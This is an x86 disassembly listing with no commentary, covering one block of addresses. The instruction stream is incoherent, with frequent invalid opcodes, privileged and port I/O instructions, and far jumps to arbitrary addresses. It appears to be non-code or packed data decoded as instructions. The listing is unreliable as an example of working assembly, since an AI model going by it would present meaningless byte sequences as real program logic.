  418067:	xor    dh,BYTE PTR [esi+0x2344a492]
  41806d:	mov    al,ds:0x505e6e4f
  418072:	pop    ebx
  418073:	and    al,0xa5
  418075:	pop    edx
  418076:	add    eax,0xfd974288
  41807b:	jb     0x41806f
  41807d:	scas   eax,DWORD PTR es:[edi]
  41807e:	add    BYTE PTR [edi],ah
  418080:	imul   edx,DWORD PTR fs:[edi],0x69
  418084:	aad    0x2d
  418086:	inc    ebx
  418087:	push   edi
  418088:	cld    
  418089:	dec    edi
  41808a:	mov    al,0x30
  41808c:	mov    al,0xf0
  41808e:	and    esp,DWORD PTR [ecx-0x33]
  418091:	inc    ebx
  418092:	mov    cs,WORD PTR [ecx-0x77]
  418095:	scas   al,BYTE PTR es:[edi]
  418096:	pop    edi
  418097:	and    dl,BYTE PTR [ecx+0x53]
  41809a:	int    0x81
  41809c:	jmp    0x41808c
  41809e:	xor    eax,DWORD PTR [ecx+0x572474ac]
  4180a4:	ja     0x418114
  4180a6:	inc    eax
  4180a7:	add    al,0xe2
  4180a9:	push   ecx
  4180aa:	push   es
  4180ab:	imul   eax,DWORD PTR [edx],0xc3084293
  4180b1:	jae    0x41810f
  4180b3:	or     eax,esp
  4180b5:	adc    bl,dl
  4180b7:	jo     0x418089
  4180b9:	inc    edi
  4180ba:	mov    ecx,0x40fc4230
  4180bf:	shl    BYTE PTR [ebp-0x451708da],0x4f
  4180c6:	xchg   DWORD PTR [ebx-0x77],ebp
  4180c9:	scas   al,BYTE PTR es:[edi]
  4180ca:	pop    edi
  4180cb:	pop    esi
  4180cc:	inc    esi
  4180cd:	xor    BYTE PTR [ebx],bh
  4180cf:	jmp    0x3355137d
  4180d4:	inc    ecx
  4180d5:	xor    eax,0x94f8802c
  4180da:	push   ss
  4180db:	dec    ebx
  4180dc:	mov    ebp,0xe90e318b
  4180e1:	sbb    bl,BYTE PTR [eax-0x74]
  4180e4:	push   0xffffff8f
  4180e6:	cmovne esi,DWORD PTR [eax-0x680f8774]
  4180ed:	xchg   ebp,eax
  4180ee:	pop    edi
  4180ef:	cmp    ebx,DWORD PTR [ebx+0x313f71d0]
  4180f5:	test   DWORD PTR [ebx+0x40],edi
  4180f8:	imul   edi,DWORD PTR [esi+0x60],0x5c65b0cf
  4180ff:	xchg   esi,eax
  418100:	std    
  418101:	ret    0x5f95
  418104:	aam    0x9e
  418106:	cmp    DWORD PTR [esi],ebp
  418108:	xchg   ebp,eax
  418109:	mov    ch,0xa4
  41810b:	aaa    
  41810c:	xchg   ebx,eax
  41810d:	pop    ds
  41810e:	jo     0x4180b7
  418110:	push   edi
  418111:	xor    eax,0xafd56f3d
  418116:	push   esi
  418117:	not    eax
  418119:	cmp    ch,BYTE PTR ds:0xa8f499cf
  41811f:	into   
  418120:	xor    eax,0x34e9e61d
  418125:	loopne 0x4180d0
  418127:	jae    0x418195
  418129:	sbb    eax,0x9dbb5d06
  41812e:	dec    ecx
  41812f:	data16 jmp 0x418182
  418132:	stos   DWORD PTR es:[edi],eax
  418133:	pusha  
  418134:	jecxz  0x418106
  418136:	in     al,dx
  418137:	pop    esi
  418138:	mov    al,0x3d
  41813a:	xor    BYTE PTR [edx+0xbcf0c11],dl
  418140:	sbb    al,0x95
  418142:	das    
  418143:	rol    BYTE PTR [eax+0x6bffae47],cl
  418149:	arpl   WORD PTR [edx],si
  41814b:	mov    al,0x7f
  41814d:	jns    0x4180f2
  41814f:	pop    esp
  418150:	popa   
  418151:	sub    BYTE PTR [ebx+0x6f3a42e3],ah
  418157:	nop
  418158:	jmp    0x41813e
  41815a:	ret    0x76c6
  41815d:	push   es
  41815e:	in     al,dx
  41815f:	cmp    al,0x11
  418161:	add    BYTE PTR [ecx],bl
  418163:	push   ebp
  418164:	iret   
  418165:	lods   eax,DWORD PTR ds:[esi]
  418166:	push   ds
  418167:	push   esp
  418168:	mov    al,BYTE PTR [ebx-0x15]
  41816b:	dec    ebx
  41816c:	lods   al,BYTE PTR ds:[esi]
  41816d:	sbb    BYTE PTR [eax*8-0x1de18d82],ch
  418174:	adc    edx,ebp
  418176:	call   0xc46e:0x383b2272
  41817d:	xchg   edi,eax
  41817e:	adc    ebp,DWORD PTR ds:0xc190556f
  418184:	fsubr  DWORD PTR [ebx]
  418186:	cdq    
  418187:	cmp    al,0xd9
  418189:	sub    dl,BYTE PTR [ebx]
  41818b:	add    eax,0x624990fc
  418190:	adc    DWORD PTR [edi],0x35a40a60
  418196:	mov    eax,ds:0xcd5abbbd
  41819b:	xchg   edx,eax
  41819c:	mov    eax,ds:0xc04095bc
  4181a1:	int3   
  4181a2:	sbb    ah,BYTE PTR [edi+0x7d200bc0]
  4181a8:	lods   eax,DWORD PTR ds:[esi]
  4181a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181aa:	pop    ecx
  4181ab:	pusha  
  4181ac:	push   ss
  4181ad:	xchg   esp,eax
  4181ae:	mov    esp,ecx
  4181b0:	push   edx
  4181b1:	add    al,0xff
  4181b3:	pop    ebp
  4181b4:	xor    al,0x7
  4181b6:	mov    bl,0xda
  4181b8:	push   edx
  4181b9:	ds in  al,0x32
  4181bc:	mov    ah,0x66
  4181be:	mov    ds:0xc724e268,eax
  4181c3:	fsubr  DWORD PTR [ecx+0x6e]
  4181c6:	add    ah,BYTE PTR [esi+0x1718436d]
  4181cc:	aam    0x1d
  4181ce:	imul   BYTE PTR [edx]
  4181d0:	das    
  4181d1:	dec    edi
  4181d2:	jle    0x4181e1
  4181d4:	cmp    al,0x55
  4181d6:	in     eax,dx
  4181d7:	out    0x7e,eax
  4181d9:	or     eax,0x60653446
  4181de:	cmp    ebx,DWORD PTR [edi]
  4181e0:	inc    ecx
  4181e1:	mov    ebp,ss
  4181e3:	xlat   BYTE PTR ds:[ebx]
  4181e4:	hlt    
  4181e5:	xchg   DWORD PTR [ecx],eax
  4181e7:	or     eax,ebp
  4181e9:	aad    0x51
  4181eb:	push   edi
  4181ec:	stc    
  4181ed:	enter  0xec8e,0x4c
  4181f1:	ins    DWORD PTR es:[edi],dx
  4181f2:	jecxz  0x41822a
  4181f4:	mov    ah,0x75
  4181f6:	inc    edx
  4181f7:	icebp  
  4181f8:	test   DWORD PTR [ecx],edi
  4181fa:	xor    al,0x29
  4181fc:	daa    
  4181fd:	imul   esi,DWORD PTR [edx+0x6e],0xffffffde
  418201:	icebp  
  418202:	(bad)  [edx+0x18]
  418205:	loopne 0x4181a6
  418207:	dec    ebx
  418208:	(bad)  
  418209:	mov    cl,0xd6
  41820b:	test   BYTE PTR [ecx],dl
  41820d:	add    edx,DWORD PTR [eax+0x68114a9f]
  418213:	mov    ah,0xc0
  418215:	xchg   BYTE PTR [esi],ah
  418217:	mov    al,ds:0xb7096ef8
  41821c:	call   0x4b5a:0x61161062
  418223:	or     eax,0xe7d2c5f3
  418228:	mov    esp,0x48a1226b
  41822d:	adc    edi,ebx
  41822f:	cmp    ah,BYTE PTR [edi-0x6f]
  418232:	or     DWORD PTR [edi],ebx
  418234:	mov    ch,0x3f
  418236:	add    al,0x2
  418238:	fdivr  DWORD PTR gs:[edi+0x34]
  41823c:	and    edx,esi
  41823e:	mov    ds:0x51ea8e07,al
  418243:	enter  0x779d,0x48
  418247:	sub    eax,DWORD PTR [edi]
  418249:	sbb    al,0x6f
  41824b:	imul   ebx,DWORD PTR [edx],0x2b5e6345
  418251:	cmp    ecx,DWORD PTR [ecx-0x40dd19b]
  418257:	(bad)  
  418258:	aam    0x79
  41825a:	dec    esi
  41825b:	repz mov edx,0xae77fd7a
  418261:	jg     0x41829d
  418263:	fimul  DWORD PTR [edx+0x6473c6a6]
  418269:	jl     0x418284
  41826b:	fcomp  QWORD PTR [esi-0x226b23d4]
  418271:	inc    esp
  418272:	hlt    
  418273:	jns    0x418234
  418275:	jo     0x41821d
  418277:	sbb    eax,0xbabca785
  41827c:	mov    al,ds:0x46c2dd3e
  418281:	cdq    
  418282:	retf   0x37e4
  418285:	mov    eax,ds:0x76c7b24d
  41828a:	ficom  WORD PTR [ebx]
  41828c:	arpl   WORD PTR [esp+ebp*1+0x5ce185f1],bp
  418293:	test   BYTE PTR [ecx+0x36],0x5a
  418297:	push   ds
  418298:	ja     0x4182b9
  41829a:	in     al,dx
  41829b:	dec    ebp
  41829c:	call   0x9ab5:0x5414d694
  4182a3:	sbb    al,0xbe
  4182a5:	pop    esp
  4182a6:	repnz aad 0x89
  4182a9:	(bad)  
  4182aa:	jge    0x4182d4
  4182ac:	into   
  4182ad:	rcr    BYTE PTR [edx],cl
  4182af:	or     eax,0xbd86807f
  4182b4:	lock push esi
  4182b6:	cld    
  4182b7:	mov    esi,0x264adf20
  4182bc:	or     ch,BYTE PTR [edx+edi*8]
  4182bf:	dec    BYTE PTR [esi+0x2745a3a1]
  4182c5:	lock pop edi
  4182c7:	xor    eax,0xc2a8b711
  4182cc:	inc    ebx
  4182cd:	push   ebx
  4182ce:	cs sbb ch,BYTE PTR cs:[edx]
  4182d2:	in     eax,dx
  4182d3:	pop    ds
  4182d4:	ss sub eax,0x3b3e8d57
  4182da:	aaa    
  4182db:	mov    cl,0xf7
  4182dd:	repz mov al,0xae
  4182e0:	sub    al,0xd7
  4182e2:	cmp    ecx,DWORD PTR [eax]
  4182e4:	fs aas 
  4182e6:	icebp  
  4182e7:	aad    0x5e
  4182e9:	lock pop ebp
  4182eb:	(bad)  
  4182ec:	retf   0xc7e3
  4182ef:	(bad)  
  4182f0:	iret   
  4182f1:	das    
  4182f2:	jmp    0x4876:0x49687da8
  4182f9:	shrd   ebx,ecx,cl
  4182fc:	pushf  
  4182fd:	jmp    0xdf39:0xbc3725a0
  418304:	dec    ebx
  418305:	shr    DWORD PTR [edx+0x3e],1
  418308:	sub    BYTE PTR [ebx+0x2b156385],dh
  41830e:	or     BYTE PTR [edi+edx*2-0x29ada7fe],bh
  418315:	adc    bh,0x42
  418318:	pop    ss
  418319:	dec    esi
  41831a:	stos   DWORD PTR es:[edi],eax
  41831b:	in     al,dx
  41831c:	dec    esi
  41831d:	div    BYTE PTR [ebp+0x651e2aef]
  418323:	jecxz  0x4182b9
  418325:	rcl    BYTE PTR [ecx-0x59],1
  418328:	mov    WORD PTR ds:0xe4e44324,gs
  41832e:	bnd jae 0x418362
  418331:	scas   eax,DWORD PTR es:[edi]
  418332:	mov    bh,0x56
  418334:	push   esp
  418335:	inc    edx
  418336:	lods   eax,DWORD PTR cs:[esi]
  418338:	call   0x5371:0xfea466e5
  41833f:	push   0x24766649
  418344:	int    0xb9
  418346:	rol    bh,1
  418348:	sbb    eax,0xdd05eaa8
  41834d:	jno    0x41831d
  41834f:	sbb    BYTE PTR [edx-0x6d],ch
  418352:	stos   BYTE PTR es:[edi],al
  418353:	lahf   
  418354:	out    dx,eax
  418355:	or     eax,0x3206b2bf
  41835a:	imul   BYTE PTR [esi]
  41835c:	jns    0x41833f
  41835e:	pop    ebp
  41835f:	mov    bh,0xe9
  418361:	mov    edx,0x5c108df2
  418366:	imul   ebx,DWORD PTR [eax-0x14cc10d8],0xb58b1c7b
  418370:	and    BYTE PTR [ecx],0xd7
  418373:	out    0x83,eax
  418375:	enter  0xfc3d,0x45
  418379:	mov    eax,ds:0x29874f5e
  41837e:	and    eax,0x6afa1c06
  418383:	sahf   
  418384:	xor    BYTE PTR [esi+edi*2-0x7f],dl
  418388:	ficom  WORD PTR [eax+0xb]
  41838b:	push   ebp
  41838c:	inc    edx
  41838d:	fimul  DWORD PTR [ebp+0x1]
  418390:	into   
  418391:	push   edi
  418392:	xchg   esp,eax
  418393:	ret    
  418394:	cmp    eax,0x302a2c1b
  418399:	ror    BYTE PTR [edi],1
  41839b:	adc    cl,BYTE PTR [ebx]
  41839d:	mov    ebx,0xc48e8bdc
  4183a2:	dec    edx
  4183a3:	xor    al,0x2a
  4183a5:	xchg   ebp,eax
  4183a6:	sbb    al,0xc9
  4183a8:	jmp    0xdf01fcea
  4183ad:	loope  0x4183f6
  4183af:	mov    ecx,0x3f466d5f
  4183b4:	push   cs
  4183b5:	cmc    
  4183b6:	imul   eax,DWORD PTR [ecx],0x58
  4183b9:	mov    al,0x83
  4183bb:	call   0xe7a3264b
  4183c0:	test   DWORD PTR [ecx+0x2e33ce39],ebp
  4183c6:	dec    ebx
  4183c7:	into   
  4183c8:	jp     0x418367
  4183ca:	mov    bh,0xa1
  4183cc:	(bad)  
  4183cd:	nop
  4183ce:	sti    
  4183cf:	sbb    edi,DWORD PTR [esp+esi*2-0x5e]
  4183d3:	mov    cl,0xe9
  4183d5:	sahf   
  4183d6:	sbb    al,BYTE PTR [esi+0x2a48dd32]
  4183dc:	nop    DWORD PTR [esi]
  4183df:	out    0xb4,al
  4183e1:	xor    eax,0xf27759b3
  4183e6:	aam    0x84
  4183e8:	clc    
  4183e9:	mov    bh,BYTE PTR [edi+0xc]
  4183ec:	xchg   esp,eax
  4183ed:	ret    
  4183ee:	pushf  
  4183ef:	loop   0x418465
  4183f1:	(bad)  
  4183f2:	fistp  DWORD PTR [ebp-0x69]
  4183f5:	mov    dh,0x90
  4183f7:	mov    edi,0x37447910
  4183fc:	sub    BYTE PTR [edx+0x48],ah
  4183ff:	dec    esi
  418400:	pop    bx
  418402:	imul   eax,DWORD PTR [edi-0x72],0xffffffc7
  418406:	aam    0x73
  418408:	or     ebx,DWORD PTR [ebx]
  41840a:	rol    BYTE PTR ds:[ebx+0xd],1
  41840e:	mov    ds:0x669b5ecb,al
  418413:	sub    ch,dh
  418415:	psubq  mm7,QWORD PTR [eiz*2-0xcb4b160]
  41841d:	or     eax,0xb383ea9
  418422:	popf   
  418423:	(bad)  
  418424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418425:	inc    esi
  418426:	adc    BYTE PTR [eax],0x1b
  418429:	push   ebx
  41842a:	aam    0xd3
  41842c:	mov    edx,0xc7c2e591
  418431:	je     0x4184a2
  418433:	pop    es
  418434:	pop    es
  418435:	rol    DWORD PTR [eax],1
  418437:	sub    edi,DWORD PTR [edi]
  418439:	ret    
  41843a:	je     0x4183c2
  41843c:	ds in  eax,0xc6
  41843f:	test   DWORD PTR [edi+0x4d],0x9e2148a0
  418446:	nop
  418447:	sub    eax,0xcfafd084
  41844c:	in     al,0x49
  41844e:	cmp    edi,DWORD PTR [ebp-0x28]
  418451:	ja     0x4183dc
  418453:	les    esi,FWORD PTR [ebx]
  418455:	ret    
  418456:	jg     0x41842e
  418458:	and    bl,BYTE PTR [ebp+ebp*1-0x3c48850b]
  41845f:	sub    dh,BYTE PTR [ebx+0x7f]
  418462:	pop    ebx
  418463:	(bad)  
  418464:	pop    esi
  418465:	aaa    
  418466:	ret    
  418467:	lods   al,BYTE PTR ds:[esi]
  418468:	repz repnz pushf 
  41846b:	ins    BYTE PTR es:[edi],dx
  41846c:	mov    ch,0x82
  41846e:	iret   
  41846f:	pop    ecx
  418470:	sub    eax,0xf4a9f929
  418475:	in     eax,dx
  418476:	add    eax,DWORD PTR [eax+0x29]
  418479:	out    0x1f,eax
  41847b:	shl    DWORD PTR [ebx-0x28862a7a],0x19
  418482:	imul   DWORD PTR [ecx]
  418484:	call   0xcb6:0x7c7a2d21
  41848b:	les    ebx,FWORD PTR [esp+eiz*4-0xcd2055f]
  418492:	loop   0x4184c6
  418494:	fisttp DWORD PTR [edi+0x6c]
  418497:	sub    cl,dh
  418499:	int    0xc1
  41849b:	push   esi
  41849c:	out    0x9a,al
  41849e:	dec    ebp
  41849f:	add    eax,0x6c00ee84
  4184a4:	mov    bh,BYTE PTR ds:0x9cdd4c6c
  4184aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184ab:	sbb    cl,BYTE PTR ds:0x8c3244ad
  4184b1:	test   BYTE PTR [edx-0x55],ch
  4184b4:	and    ah,BYTE PTR [esi+0x7af9e956]
  4184ba:	(bad)  
  4184bb:	push   ecx
  4184bc:	adc    eax,0xe3628552
  4184c1:	xchg   edi,eax
  4184c2:	cmc    
  4184c3:	data16 jnp 0x418447
  4184c6:	xchg   edx,eax
  4184c7:	icebp  
  4184c8:	xchg   ebp,eax
  4184c9:	call   0x22de:0x8dadf0d3
  4184d0:	push   edi
  4184d1:	xor    DWORD PTR ds:0x90516a77,edx
  4184d7:	fist   DWORD PTR [ebp+eax*4+0x47]
  4184db:	out    0x11,al
  4184dd:	ss aaa 
  4184df:	or     DWORD PTR [edx+0x2c],ebp
  4184e2:	sahf   
  4184e3:	xchg   edi,eax
  4184e4:	ret    
  4184e5:	aam    0x9a
  4184e7:	jg     0x4184e9
  4184e9:	add    BYTE PTR [ebx+0x56128c99],cl
  4184ef:	pop    ebp
  4184f0:	cwde   
  4184f1:	les    ebp,FWORD PTR [edi+0x145d22b5]
  4184f7:	shl    ch,cl
  4184f9:	add    ch,BYTE PTR ds:[ecx]
  4184fc:	sbb    ecx,0x3d62af3c
  418502:	add    edi,DWORD PTR [edx+0x393b46b4]
  418508:	out    0xaa,al
  41850a:	jae    0x41854d
  41850c:	je     0x418515
  41850e:	pop    ebx
  41850f:	cmp    al,0x76
  418511:	mov    ah,0xde
  418513:	scas   eax,DWORD PTR es:[edi]
  418514:	inc    esp
  418515:	mov    ds:0x23957e2e,al
  41851a:	test   al,0x5e
  41851c:	lds    ecx,FWORD PTR [esi-0x55]
  41851f:	js     0x41851d
  418521:	nop
  418522:	push   eax
  418523:	mov    BYTE PTR [edi-0x3],cl
  418526:	pop    ss
  418527:	sahf   
  418528:	jmp    0x4184c0
  41852a:	jnp    0x4184c6
  41852c:	cli    
  41852d:	ins    DWORD PTR es:[edi],dx
  41852e:	xchg   ecx,eax
  41852f:	lds    esi,FWORD PTR [ecx+0x5426bd5f]
  418535:	(bad)  
  418536:	adc    DWORD PTR [ebx],ebp
  418538:	xchg   ecx,eax
  418539:	out    0x1d,eax
  41853b:	cmp    bl,BYTE PTR [edx+ebp*4]
  41853e:	and    ebp,ecx
  418540:	daa    
  418541:	xchg   ebx,eax
  418542:	loop   0x418511
  418544:	mov    dl,0x4c
  418546:	and    al,0x5
  418548:	add    DWORD PTR [edx+0x1e934556],ebp
  41854e:	out    dx,eax
  41854f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418551:	lods   eax,DWORD PTR ds:[esi]
  418552:	in     al,0x3b
  418554:	je     0x41853f
  418556:	js     0x4185c0
  418558:	clc    
  418559:	lock or DWORD PTR [esi+0x27],ebp
  41855d:	push   esp
  41855e:	mov    ds,WORD PTR [ebx+0x5b695296]
  418564:	add    eax,eax
  418566:	xchg   ebp,ebp
  418568:	xlat   BYTE PTR ds:[ebx]
  418569:	fnstsw WORD PTR [ebp+0x58]
  41856c:	sar    DWORD PTR [ebp-0xb],0xae
  418570:	pushf  
  418571:	xchg   BYTE PTR [esi+0x544a455],al
  418577:	jp     0x418552
  418579:	mov    ds:0x941feea4,al
  41857e:	sahf   
  41857f:	adc    BYTE PTR [esi+0xf0cd97c],cl
  418585:	je     0x4185fd
  418587:	xor    eax,0x2ad49c3e
  41858c:	stc    
  41858d:	push   esi
  41858e:	xchg   edi,eax
  41858f:	mov    esi,ebp
  418591:	popf   
  418592:	mov    BYTE PTR [eax+0x1c],ah
  418595:	es cld 
  418597:	sub    al,BYTE PTR [ebx-0xd]
  41859a:	in     eax,dx
  41859b:	lds    esp,FWORD PTR [ebp+0x6de875af]
  4185a1:	adc    al,0x49
  4185a3:	or     esp,DWORD PTR [edx-0x19]
  4185a6:	mov    esi,0x525b13bf
  4185ab:	push   cs
  4185ac:	fadd   DWORD PTR [ebx]
  4185ae:	iret   
  4185af:	push   ds
  4185b0:	adc    dh,dh
  4185b2:	enter  0x5689,0x49
  4185b6:	stos   BYTE PTR es:[edi],al
  4185b7:	mov    esp,0xa85d0fc1
  4185bc:	xchg   ebp,eax
  4185bd:	mov    ah,0x82
  4185bf:	mov    ds:0xfb8d78a7,eax
  4185c4:	(bad)  
  4185c5:	stos   BYTE PTR es:[edi],al
  4185c6:	mov    bl,0x4c
  4185c8:	outs   dx,WORD PTR ds:[esi]
  4185ca:	ret    0x3e6c
  4185cd:	dec    eax
  4185ce:	ins    DWORD PTR es:[edi],dx
  4185cf:	add    BYTE PTR [edx-0x3a],cl
  4185d2:	push   cs
  4185d3:	inc    ebx
  4185d4:	xor    eax,0x1921a5f9
  4185d9:	(bad)
  4185dc:	gs pusha 
  4185de:	push   ecx
  4185df:	mov    esp,0x66d72fc3
  4185e4:	sub    eax,0x125b6574
  4185e9:	test   BYTE PTR [edi-0x5d131f83],al
  4185ef:	mov    dl,0x8f
  4185f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185f2:	inc    ecx
  4185f3:	mov    dl,0xa6
  4185f5:	mul    ecx
  4185f7:	adc    esi,DWORD PTR [ecx+0x74]
  4185fa:	mov    dh,0x4b
  4185fc:	mov    al,ds:0x9bb9f839
  418601:	cmp    esp,edi
  418603:	xchg   edx,eax
  418604:	jmp    0x4185e5
  418606:	sbb    DWORD PTR [ecx+0x5572d9f2],esi
  41860c:	lock inc esi
  41860e:	xchg   esp,eax
  41860f:	dec    BYTE PTR [edi]
  418611:	xchg   esp,eax
  418612:	retf   0x633b
  418615:	and    ebp,DWORD PTR [edx+0x59503523]
  41861b:	popa   
  41861c:	push   0x4ffd6e28
  418621:	hlt    
  418622:	cmc    
  418623:	or     BYTE PTR [edx],bl
  418625:	fistp  WORD PTR [ebp-0x2c92b94b]
  41862b:	push   eax
  41862c:	cmp    eax,0x699ed317
  418631:	aad    0x1f
  418633:	rcr    BYTE PTR [ebp-0x4b],0x2c
  418637:	mov    bh,0xe1
  418639:	out    dx,al
  41863a:	sub    al,0x2f
  41863c:	add    BYTE PTR [esp+edx*8-0x17456273],0xd
  418644:	sbb    dl,BYTE PTR [eax-0x5af2ec72]
  41864a:	leave  
  41864b:	jmp    0xb0e5:0x7159719b
  418652:	xlat   BYTE PTR ds:[ebx]
  418653:	jmp    0x4186ba
  418655:	das    
  418656:	(bad)  
  418657:	adc    eax,0x81ff37fa
  41865c:	(bad)  
  41865d:	mov    ah,0xc7
  41865f:	into   
  418660:	adc    dh,BYTE PTR [esi-0x243077e1]
  418666:	int3   
  418667:	fsub   QWORD PTR [ebp-0x3c]
  41866a:	xor    DWORD PTR [ebx+0x4f4c1a32],0x65e39579
  418674:	jg     0x4186d7
  418676:	jle    0x418690
  418678:	cwde   
  418679:	add    eax,0xbe628a26
  41867e:	imul   ebx,eax,0xffffff99
  418681:	push   ecx
  418682:	call   0xa312:0x4b86d2e5
  418689:	out    0x35,al
  41868b:	mov    ebp,0xb48b6ac2
  418690:	jmp    0x418684
  418692:	inc    esp
  418693:	and    dl,BYTE PTR [edi+edx*4]
  418696:	push   edx
  418697:	aaa    
  418698:	lea    ecx,gs:[ecx+0x29]
  41869c:	sbb    BYTE PTR [esi-0x75901fa2],ah
  4186a2:	add    BYTE PTR [eax],bh
  4186a4:	ret    0xced0
  4186a7:	aam    0x62
  4186a9:	in     eax,0x60
  4186ab:	jo     0x418683
  4186ad:	jmp    0x5c780b07
  4186b2:	call   0x6383:0xc8c3d4b8
  4186b9:	mov    ds:0xa68f2e93,al
  4186be:	out    dx,al
  4186bf:	inc    ebx
  4186c0:	daa    
  4186c1:	jne    0x4186db
  4186c3:	iret   
  4186c4:	mov    bh,0xd8
  4186c6:	cmp    esp,ebp
  4186c8:	sub    eax,DWORD PTR [esi-0x2a]
  4186cb:	xchg   ecx,eax
  4186cc:	cli    
  4186cd:	mov    cl,0x4
  4186cf:	sub    BYTE PTR [eax],dh
  4186d1:	add    eax,0x9b1f3725
  4186d6:	adc    al,0x12
  4186d8:	jmp    0x72d8bc1
  4186dd:	cwde   
  4186de:	mov    WORD PTR [ebx+0x9],gs
  4186e1:	hlt    
  4186e2:	iret   
  4186e3:	or     al,0x1f
  4186e5:	cs jg  0x41872e
  4186e8:	and    al,0x1c
  4186ea:	dec    edx
  4186eb:	ret    0xdd49
  4186ee:	jl     0x41871a
  4186f0:	mov    bh,0x67
  4186f2:	xchg   edx,eax
  4186f3:	cmp    dl,0x14
  4186f6:	jmp    0xa891:0x5e7b69aa
  4186fd:	jg     0x4186aa
  4186ff:	xor    bh,BYTE PTR [edi+0x1c]
  418702:	mov    DWORD PTR [edx],eax
  418704:	mov    WORD PTR [ebp-0x73],?
  418707:	or     al,0xcd
  418709:	cmp    al,0x4c
  41870b:	test   edi,ecx
  41870d:	or     eax,0xdbc10efd
  418712:	jo     0x418727
  418714:	or     DWORD PTR [esi-0x17],ecx
  418717:	push   ecx
  418718:	adc    eax,0xc57acace
  41871d:	das    
  41871e:	mov    edi,0xa64ca4f6
  418723:	les    esi,FWORD PTR [ecx-0x30]
  418726:	ficom  DWORD PTR [edi+0x28]
  418729:	xchg   ebx,eax
  41872a:	les    eax,FWORD PTR [ebp+ebp*1+0x28b85226]
  418731:	or     ecx,DWORD PTR [ebp+0x10]
  418734:	ficom  WORD PTR [ebx]
  418736:	push   edi
  418737:	pop    esp
  418738:	fmul   st(0),st
  41873a:	test   dl,bl
  41873c:	repnz outs dx,BYTE PTR ds:[esi]
  41873e:	iret   
  41873f:	mul    BYTE PTR gs:[edx-0x796378c3]
  418746:	adc    edi,esp
  418748:	cdq    
  418749:	cmp    ecx,esp
  41874b:	xor    al,0x8b
  41874d:	mov    ch,0xae
  41874f:	push   ebp
  418750:	sbb    esp,esp
  418752:	fcomip st,st(4)
  418754:	mov    eax,0x515995cb
  418759:	or     BYTE PTR [ecx+0xb9ba3c4],bh
  41875f:	inc    ecx
  418760:	(bad)  
  418761:	xor    DWORD PTR [esi-0x7d7e9a44],edx
  418767:	addr16 mov esp,0x54034a61
  41876d:	add    eax,0x9f164d1
  418772:	pop    es
  418773:	inc    ebx
  418774:	hlt    
  418775:	xchg   ebp,eax
  418776:	fadd   DWORD PTR [ecx-0x33]
  418779:	jne    0x4187aa
  41877b:	jp     0x4187df
  41877d:	mov    ds:0x3ef8c3ec,al
  418782:	push   es
  418783:	push   0x77
  418785:	jmp    0x7cf5:0x864d5856
  41878c:	ss ins BYTE PTR es:[edi],dx
  41878e:	push   0x419fd676
  418793:	imul   esp,DWORD PTR [edi],0x75
  418796:	dec    ebp
  418797:	cld    
  418798:	(bad)
  41879b:	push   ebp
  41879c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41879d:	fbstp  TBYTE PTR [edi]
  41879f:	and    DWORD PTR [edi],esp
  4187a1:	mov    esp,0x9c69bccd
  4187a6:	lock jmp 0x288b534c
  4187ac:	test   BYTE PTR [edi+0x10],dl
  4187af:	push   edx
  4187b0:	(bad)  
  4187b1:	repnz mov cs,eax
  4187b4:	fnsave [eax-0x6151bca3]
  4187ba:	in     eax,0x9f
  4187bc:	or     BYTE PTR [edi-0x60],bh
  4187bf:	vpmacssdd ymm2,ymm0,YMMWORD PTR [edi+eiz*4],ymm2
  4187c6:	inc    edx
  4187c7:	xchg   bl,bh
  4187c9:	fistp  DWORD PTR [ecx+0x3d]
  4187cc:	cs jp  0x4187c1
  4187cf:	push   0x5e
  4187d1:	mov    edi,0x74e71f9
  4187d6:	mov    ecx,0xd1546ed3
  4187db:	addr16 xchg edi,eax
  4187dd:	or     al,0xfb
  4187df:	mov    ch,cl
  4187e1:	or     ch,BYTE PTR [edx-0x1a28421a]
  4187e7:	inc    ebp
  4187e8:	mov    esi,ecx
  4187ea:	or     eax,0x75ddf183
  4187ef:	cmp    al,0x43
  4187f1:	xchg   esp,eax
  4187f2:	cmp    DWORD PTR ds:0x9792a8a5,ecx
  4187f8:	loopne 0x4187d8
  4187fa:	test   eax,0x149fff95
  4187ff:	or     eax,0xf3f389e6
  418804:	jge    0x4187fd
  418806:	sbb    dl,BYTE PTR [edx-0x65]
  418809:	cwde   
  41880a:	sbb    al,0x9e
  41880c:	mov    bl,0xd
  41880e:	leave  
  41880f:	xchg   BYTE PTR [edi+0x4],cl
  418812:	adc    esi,DWORD PTR [ecx+0x61]
  418815:	popf   
  418816:	data16 fisub WORD PTR [ebx]
  418819:	stos   DWORD PTR es:[edi],eax
  41881a:	leave  
  41881b:	xor    bl,ah
  41881d:	adc    DWORD PTR [ecx+0x11],0x945c92fe
  418824:	ret    0xe21f
  418827:	dec    esi
  418828:	ins    BYTE PTR es:[edi],dx
  418829:	mov    al,ds:0x3cc8e195
  41882e:	jmp    0x418888
  418830:	pop    ebp
  418831:	fiadd  WORD PTR [ebx]
  418833:	xor    DWORD PTR [eax],edi
  418835:	add    al,ch
  418837:	popf   
  418838:	xor    DWORD PTR [ecx-0x4b85463a],ecx
  41883e:	pop    gs
  418840:	js     0x418865
  418842:	ins    BYTE PTR es:[edi],dx
  418843:	or     al,0xa
  418845:	sub    eax,0x41ec3c9
  41884a:	pop    eax
  41884b:	dec    ebp
  41884c:	ja     0x418850
  41884e:	(bad)  
  41884f:	mov    dl,0xed
  418851:	call   0x68d3:0x9f27d3c
  418858:	cmp    bh,al
  41885a:	fucomp st(2)
  41885c:	sub    al,0xb2
  41885e:	mov    edi,0x3bb12882
  418863:	jle    0x4187fa
  418865:	shl    BYTE PTR [eax+0x27f5bf98],cl
  41886b:	in     al,dx
  41886c:	je     0x418874
  41886e:	icebp  
  41886f:	push   0x1b
  418871:	dec    edx
  418872:	pop    edx
  418873:	jo     0x418889
  418875:	(bad)  [esi]
  418877:	outs   dx,BYTE PTR ds:[esi]
  418878:	das    
  418879:	sub    bh,BYTE PTR [esi+0x8ba9579]
  41887f:	retf   0xd85a
  418882:	adc    BYTE PTR [esi],0x6c
  418885:	or     edx,DWORD PTR [edi+0x1d]
  418888:	xchg   esi,eax
  418889:	ins    BYTE PTR es:[edi],dx
